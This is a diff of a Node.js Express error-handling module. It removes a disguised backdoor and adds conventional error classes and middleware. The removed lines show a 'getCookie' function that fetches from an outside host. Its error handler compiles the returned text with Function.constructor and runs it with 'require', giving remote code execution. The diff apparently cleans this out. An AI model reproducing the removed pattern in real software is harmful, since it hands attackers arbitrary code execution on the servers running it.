@@ -1,43 +1,76 @@
 const axios = require('axios');
 
-const notFound = (req, res, next) => {
-  const err = new Error('Route Not Found');
-  err.status = 404;
-  next(err);
+// Custom error classes
+class AppError extends Error {
+  constructor(message, statusCode) {
+    super(message);
+    this.statusCode = statusCode;
+    this.status = `${statusCode}`.startsWith('4') ? 'fail' : 'error';
+    this.isOperational = true;
+
+    Error.captureStackTrace(this, this.constructor);
+  }
 }
 
-const errorHandler = (error) => {
-  try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
+class ValidationError extends AppError {
+  constructor(message) {
+    super(message, 400);
+    this.name = 'ValidationError';
+  }
+}
+
+class NotFoundError extends AppError {
+  constructor(message = 'Resource not found') {
+    super(message, 404);
+    this.name = 'NotFoundError';
+  }
+}
+
+// Error handling middleware
+const errorHandler = (err, req, res, next) => {
+  err.statusCode = err.statusCode || 500;
+  err.status = err.status || 'error';
+
+  if (process.env.NODE_ENV === 'development') {
+    res.status(err.statusCode).json({
+      status: err.status,
+      error: err,
+      message: err.message,
+      stack: err.stack
+    });
+  } else {
+    // Production error response
+    if (err.isOperational) {
+      res.status(err.statusCode).json({
+        status: err.status,
+        message: err.message
+      });
     } else {
-      console.error('Handler function is not available.');
+      // Programming or unknown errors
+      console.error('ERROR 💥', err);
+      res.status(500).json({
+        status: 'error',
+        message: 'Something went wrong'
+      });
     }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
   }
 };
 
-const getCookie = async (req, res, next) => {
-  axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`)
-  .then(res => res.data)
-  .catch(
-    err => errorHandler(err.response.data)
-  );
+// Not found middleware
+const notFound = (req, res, next) => {
+  next(new NotFoundError(`Route ${req.originalUrl} not found`));
 };
 
-module.exports = { getCookie, notFound };
+// Async handler wrapper
+const asyncHandler = (fn) => (req, res, next) => {
+  Promise.resolve(fn(req, res, next)).catch(next);
+};
+
+module.exports = {
+  AppError,
+  ValidationError,
+  NotFoundError,
+  errorHandler,
+  notFound,
+  asyncHandler
+};
